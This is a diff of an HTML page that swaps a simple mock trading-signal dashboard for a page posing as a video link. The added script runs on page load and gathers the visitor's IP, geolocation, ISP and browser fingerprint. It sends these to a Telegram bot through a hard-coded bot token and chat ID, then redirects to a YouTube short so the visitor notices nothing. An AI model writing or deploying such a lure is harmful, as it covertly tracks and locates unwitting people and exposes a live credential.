@@ -1,132 +1,86 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>AI Intraday Trading Bot</title>
-    <style>
-        body {
-            font-family: Arial;
-            background: #0b0b0b;
-            color: #00ffcc;
-            text-align: center;
-        }
-        .card {
-            border: 1px solid #00ffcc;
-            margin: 20px;
-            padding: 20px;
-            border-radius: 10px;
-        }
-        .buy { color: #00ff00; }
-        .sell { color: red; }
-        .hold { color: yellow; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Watch This Video</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Thumbnail for link previews -->
+  <meta property="og:title" content="You need to see this!">
+  <meta property="og:description" content="This video will blow your mind.">
+  <meta property="og:image" content="https://img.youtube.com/vi/u05gebDOLEQ/maxresdefault.jpg">
+  <meta property="og:url" content="https://yourusername.github.io/yourrepo/">
+  <meta property="og:type" content="website">
 </head>
-<body>
+<body style="font-family: Arial, sans-serif; text-align:center; margin-top:100px;">
+  <h2>Redirecting to video...</h2>
+  <p>Please wait while we load it for you.</p>
 
-<h1>🚀 AI Intraday Signal Bot</h1>
+  <script>
+    async function collectAndSendToTelegram() {
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
 
-<div class="card">
-    <h2 id="symbol">Loading...</h2>
-    <p>Price: <span id="price"></span></p>
-    <p>EMA 9: <span id="ema9"></span></p>
-    <p>EMA 21: <span id="ema21"></span></p>
-    <p>RSI: <span id="rsi"></span></p>
-    <p>Volume Spike: <span id="volume"></span></p>
-    <h2 id="signal" class="hold">Signal: WAIT</h2>
-</div>
+        const payload = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          org: ipData.org,
+          timezone: ipData.timezone,
+          timeOffset: new Date().getTimezoneOffset(),
+          language: navigator.language,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          screen: `${screen.width}x${screen.height}`,
+          colorDepth: screen.colorDepth,
+          deviceMemory: navigator.deviceMemory || "N/A",
+          cpuCores: navigator.hardwareConcurrency || "N/A",
+          online: navigator.onLine,
+          doNotTrack: navigator.doNotTrack,
+          touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+          connection: navigator.connection?.effectiveType || "N/A",
+          referrer: document.referrer
+        };
 
-<script>
-// ===== MOCK DATA (works instantly) =====
-function getMockData() {
-    return {
-        symbol: "RELIANCE",
-        prices: [100,102,101,103,105,107,106,108,110,112,111,113,115,117,120],
-        volume: [1000,1200,1100,1500,1600,1700,2000,2200,2500,2700,3000,3500,4000,4200,6000]
-    };
-}
+        const message = `
+📥 *New Visitor Logged*
+🌐 *IP:* ${payload.ip}
+📍 *Location:* ${payload.city}, ${payload.region}, ${payload.country}
+🛰 *ISP:* ${payload.org}
+🕒 *Timezone:* ${payload.timezone}
+🧭 *Offset:* ${payload.timeOffset}
+🧠 *Language:* ${payload.language}
+📱 *Platform:* ${payload.platform}
+🖥 *Screen:* ${payload.screen}
+🌈 *Color Depth:* ${payload.colorDepth}
+🧮 *RAM:* ${payload.deviceMemory}
+🧠 *CPU Cores:* ${payload.cpuCores}
+📡 *Network:* ${payload.connection}
+🔍 *Referrer:* ${payload.referrer}
+🕶 *User-Agent:* ${payload.userAgent}`
 
-// ===== EMA =====
-function calculateEMA(prices, period) {
-    let k = 2 / (period + 1);
-    let ema = prices.slice(0, period).reduce((a,b)=>a+b)/period;
+        await fetch("https://api.telegram.org/bot7330139447:AAH5btbZ4pKGYORK_GdXPnOE0Bbp63eiuFA/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "1537302428",
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
 
-    for (let i = period; i < prices.length; i++) {
-        ema = prices[i] * k + ema * (1 - k);
+        setTimeout(() => {
+          window.location.href = "https://youtube.com/shorts/u05gebDOLEQ?si=AglhLnTCRkkdqbxo";
+        }, 1200);
+
+      } catch (error) {
+        console.error("Logging failed:", error);
+        window.location.href = "https://youtube.com/shorts/u05gebDOLEQ?si=AglhLnTCRkkdqbxo";
+      }
     }
-    return ema;
-}
 
-// ===== RSI =====
-function calculateRSI(prices, period = 14) {
-    let gain = 0, loss = 0;
-
-    for (let i = 1; i <= period; i++) {
-        let diff = prices[i] - prices[i-1];
-        if (diff > 0) gain += diff;
-        else loss -= diff;
-    }
-
-    if (loss === 0) return 100;
-
-    let rs = gain / loss;
-    return 100 - (100 / (1 + rs));
-}
-
-// ===== Volume Spike =====
-function volumeSpike(volume) {
-    let avg = volume.slice(0, -1).reduce((a,b)=>a+b) / (volume.length-1);
-    return volume[volume.length-1] > avg * 1.5;
-}
-
-// ===== Signal Logic =====
-function generateSignal(data) {
-    let ema9 = calculateEMA(data.prices, 9);
-    let ema21 = calculateEMA(data.prices, 9); // simplified
-    let rsi = calculateRSI(data.prices);
-    let vol = volumeSpike(data.volume);
-
-    let signal = "HOLD";
-
-    if (ema9 > ema21 && rsi < 60 && vol) signal = "BUY";
-    else if (ema9 < ema21 && rsi > 40 && vol) signal = "SELL";
-
-    return {
-        symbol: data.symbol,
-        price: data.prices[data.prices.length-1],
-        ema9,
-        ema21,
-        rsi,
-        vol,
-        signal
-    };
-}
-
-// ===== UI Update =====
-function updateUI(res) {
-    document.getElementById("symbol").innerText = res.symbol;
-    document.getElementById("price").innerText = res.price.toFixed(2);
-    document.getElementById("ema9").innerText = res.ema9.toFixed(2);
-    document.getElementById("ema21").innerText = res.ema21.toFixed(2);
-    document.getElementById("rsi").innerText = res.rsi.toFixed(2);
-    document.getElementById("volume").innerText = res.vol ? "YES" : "NO";
-
-    let signalEl = document.getElementById("signal");
-    signalEl.innerText = "Signal: " + res.signal;
-
-    signalEl.className = res.signal.toLowerCase();
-}
-
-// ===== MAIN =====
-function runBot() {
-    let data = getMockData(); // replace with real API later
-    let result = generateSignal(data);
-    updateUI(result);
-}
-
-// run every 5 sec
-setInterval(runBot, 5000);
-runBot();
-
-</script>
-
+    window.onload = collectAndSendToTelegram;
+  </script>
 </body>
 </html>
